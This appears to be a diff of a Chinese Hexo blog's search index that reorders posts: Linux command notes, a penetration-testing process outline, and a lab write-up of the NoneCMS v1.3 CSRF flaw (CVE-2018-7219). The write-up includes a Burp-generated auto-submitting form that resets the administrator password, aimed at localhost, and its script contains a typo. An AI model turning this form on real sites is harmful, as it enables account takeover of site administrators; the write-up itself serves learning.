+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /var/www/xin/A.html /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="2-复制文件夹到另一个文件夹"><a href="#2-复制文件夹到另一个文件夹" class="headerlink" title="2. 复制文件夹到另一个文件夹"></a>2. 复制文件夹到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">cp -r A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如复制 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -r /var/www/xin/ /usr/xxx/ </span><br></pre></td></tr></table></figure>
+<h4 id="3-移动文件-夹-到另一个文件夹"><a href="#3-移动文件-夹-到另一个文件夹" class="headerlink" title="3. 移动文件(夹)到另一个文件夹"></a>3. 移动文件(夹)到另一个文件夹</h4><figure class="highlight plaintext"><figcaption><span>[命令]</span></figcaption><table><tr><td class="code"><pre><span class="line">mv A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>例如移动 <code>A.html</code> 或者 <code>B.jpg</code> 或者 <code>C.word</code> 或 <code>D.zip</code> 或者 <code>xin</code> 文件夹 到另一个文件夹 <code>xxx</code> 中，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /var/www/xin/A.html /usr/xxx/ </span><br><span class="line">mv /var/www/xin /usr/xxx</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="三、通过-ssh-拷贝远程-Linux-服务器上文件-夹"><a href="#三、通过-ssh-拷贝远程-Linux-服务器上文件-夹" class="headerlink" title="三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)"></a>三、通过 ssh 拷贝远程 Linux 服务器上文件(夹)</h3><h4 id="1-Mac-拷贝服务器文件到本地"><a href="#1-Mac-拷贝服务器文件到本地" class="headerlink" title="1. Mac 拷贝服务器文件到本地"></a>1. Mac 拷贝服务器文件到本地</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp 用户名@IP地址:A路径 B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝 <code>xxx.xxx.xxx.xxx</code> 服务器上 <code>data.py</code> 文件夹到本地桌面，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp user@xxx.xxx.xxx.xxx:/home/user/Desktop/data.py /Users/user/Desktop</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Mac-拷贝本地文件到服务器"><a href="#2-Mac-拷贝本地文件到服务器" class="headerlink" title="2. Mac 拷贝本地文件到服务器"></a>2. Mac 拷贝本地文件到服务器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp A路径 用户名@IP地址:B路径</span><br></pre></td></tr></table></figure>
+<p>比如用户 <code>user</code> 拷贝本地文件 <code>a.jpg</code> 到 <code>xxx.xxx.xxx.xxx</code> 服务器上作为 <code>b.jpg</code>，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /Users/xxx/Desktop/a.jpg user@xxx.xxx.xxx.xxx:/home/user/Desktop/Data/b.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-Mac-拷贝文件夹"><a href="#3-Mac-拷贝文件夹" class="headerlink" title="3. Mac 拷贝文件夹"></a>3. Mac 拷贝文件夹</h4><p>参考以上命令，只需在 <code>scp</code> 后多添加指令参数 <code>–r</code> 即可:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp –r  …</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="四、Linux-命令行查看-编辑文件"><a href="#四、Linux-命令行查看-编辑文件" class="headerlink" title="四、Linux 命令行查看/编辑文件"></a>四、Linux 命令行查看/编辑文件</h3><p>可以使用 <code>vi</code> 或 <code>vim</code> 查看/编辑文件，后跟文件路径(当前路径直接跟文件名)即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /path/to/file</span><br></pre></td></tr></table></figure>
+<p>这时就进入了指令模式，可以看见文件内容（如果文件存在的话，如果此文件不存在，该命令会创建文件）</p>
+<ul>
+<li>处于光标之下的字符使用 <code>x</code> 字符删除（仅限指令模式）</li>
+<li>按 <code>i</code> 就进入了 <code>编辑insert</code> 模式，便可以开始编辑文本了</li>
+<li>按 <code>ESC</code> 退出编辑模式</li>
+<li>如果没做修改退出文本，键入 <code>:q</code>；做了修改但不保存文本退出，键入 <code>:q!</code>；做了修改并保存退出文本，键入 <code>:wq</code> </li>
+</ul>
+<p>vi 和 vim 都是 Linux 中的编辑器，不同的是 vim 比较高级，可以视为 vi 的升级版本，vi 使用于文本编辑，vim 更适用于 coding 。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Machine Learning 2021 Spring - Day1</title>
     <url>/2021/09/06/Machine-Learning-2021-Spring-Day1/</url>
     <content><![CDATA[<h2 id="一、机器学习基本概念"><a href="#一、机器学习基本概念" class="headerlink" title="一、机器学习基本概念"></a>一、机器学习基本概念</h2><blockquote class="blockquote-center">
@@ -1038,6 +1038,37 @@
       </tags>
   </entry>
   <entry>
+    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
+    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
+    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
+<span id="more"></span>
+
+
+<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
+<p>以修改管理员密码为例，来说明漏洞详情：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
+<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
+<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
+<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
+<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
+<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
+<h4> 参考链接</h4>
+
+<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>My First Blog</title>
     <url>/2021/07/31/My-First-Blog/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
@@ -1139,37 +1170,6 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
-    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
-    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
-    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
-<span id="more"></span>
-
-
-<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
-<p>以修改管理员密码为例，来说明漏洞详情：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
-<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
-<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
-<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
-<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
-<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
-<h4> 参考链接</h4>
-
-<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sublime text3配置PHP</title>
     <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
     <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
@@ -1238,6 +1238,24 @@ $ hexo d # == hexo deploy 上传
         <tag>PHP</tag>
         <tag>Sublime text3</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/07/26/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>Windows转Mac继续管理GitHub博客</title>
@@ -1313,22 +1331,68 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/07/26/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>网站渗透测试流程</title>
+    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<span id="more"></span>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
+<li>确定范围：测试目标的范围，IP、域名、内外网</li>
+<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
+<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
+<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
+</ol>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
+<li>方式：主动扫描、开放搜索等</li>
+<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
+<li>基础信息：IP、网段、域名、端口</li>
+<li>系统信息：操作系统版本</li>
+<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
+<li>版本信息：所有这些探测到的东西的版本</li>
+<li>服务信息</li>
+<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
+<li>防护信息：试着看能否探测到防护设备</li>
+</ol>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
+<ol>
+<li>方法：<ul>
+<li>漏扫、AWVS、IBM appscan等</li>
+<li>结合漏洞去exploit-db等位置找利用</li>
+<li>网上寻找验证poc</li>
+</ul>
+</li>
+<li>内容：<ul>
+<li>系统漏洞：系统没有及时打补丁</li>
+<li>Webserver漏洞：Webserver配置问题</li>
+<li>Web应用漏洞：Web应用开发问题</li>
+<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
+<li>通信安全：明文传输、token在cookie中传输等</li>
+</ul>
+</li>
+</ol>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
+<ul>
+<li>自动化验证：结合自动化扫描工具提供的结果</li>
+<li>手工验证：根据公开资源进行验证</li>
+<li>试验验证：自己搭建模拟环境进行验证</li>
+<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
+<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
+</ul>
+<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
+<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
+<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
+<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
+</ol>
+<hr>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
 ]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>侧信道攻击技术学习</title>
@@ -1422,70 +1486,6 @@ $ hexo d # == hexo deploy 上传
       </categories>
       <tags>
         <tag>侧信道</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网站渗透测试流程</title>
-    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
-    <content><![CDATA[<span id="more"></span>
-
-
-<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
-<li>确定范围：测试目标的范围，IP、域名、内外网</li>
-<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
-<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
-<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
-</ol>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
-<li>方式：主动扫描、开放搜索等</li>
-<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
-<li>基础信息：IP、网段、域名、端口</li>
-<li>系统信息：操作系统版本</li>
-<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
-<li>版本信息：所有这些探测到的东西的版本</li>
-<li>服务信息</li>
-<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
-<li>防护信息：试着看能否探测到防护设备</li>
-</ol>
-<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
-<ol>
-<li>方法：<ul>
-<li>漏扫、AWVS、IBM appscan等</li>
-<li>结合漏洞去exploit-db等位置找利用</li>
-<li>网上寻找验证poc</li>
-</ul>
-</li>
-<li>内容：<ul>
-<li>系统漏洞：系统没有及时打补丁</li>
-<li>Webserver漏洞：Webserver配置问题</li>
-<li>Web应用漏洞：Web应用开发问题</li>
-<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
-<li>通信安全：明文传输、token在cookie中传输等</li>
-</ul>
-</li>
-</ol>
-<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
-<ul>
-<li>自动化验证：结合自动化扫描工具提供的结果</li>
-<li>手工验证：根据公开资源进行验证</li>
-<li>试验验证：自己搭建模拟环境进行验证</li>
-<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
-<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
-</ul>
-<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
-<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
-<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
-<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
-</ol>
-<hr>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
